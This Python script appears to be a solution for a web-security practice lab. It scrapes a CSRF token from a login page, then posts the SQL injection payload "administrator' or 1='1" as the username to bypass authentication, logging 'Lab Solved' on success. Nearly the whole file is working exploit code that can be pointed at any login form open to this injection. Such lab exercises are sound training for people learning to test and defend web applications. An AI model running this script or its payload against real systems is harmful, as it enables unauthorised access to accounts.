from base.base import Base

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def _add_args(self):
        pass

    def _get_csrf_token(self):
        response = self.session.get(f"{self.base_url}/login")
        
        # Extract CSRF token from the hidden input field in the HTML response
        html_content = response.text
        csrf_token = None
        
        # Look for the hidden input field with name="csrf"
        import re
        csrf_match = re.search(r'<input\s+[^>]*name="csrf"\s+[^>]*value="([^"]+)"', html_content)
        if csrf_match:
            csrf_token = csrf_match.group(1)
            if self.verbose:
                self.log(f"Found CSRF token: {csrf_token}", "info")
        else:
            self.log("Could not find CSRF token in the response", "error")
            exit(1)
            
        return csrf_token

    def run(self):
        csrf_token = self._get_csrf_token()
        
        self.params = {'username': "administrator' or 1='1", 'password': "administrator", 'csrf': csrf_token}
        response = self.session.post(f"{self.base_url}/login", data=self.params)

        if self.verbose:
            self.log(f"Response status code: {response.status_code}", "info")

        if response.status_code == 200:
            self.log("Lab Solved", "success")
        else:
            self.log(f"Failed to solve lab", "error")
        


if __name__ == "__main__":
    sql = SQL()
    sql.run()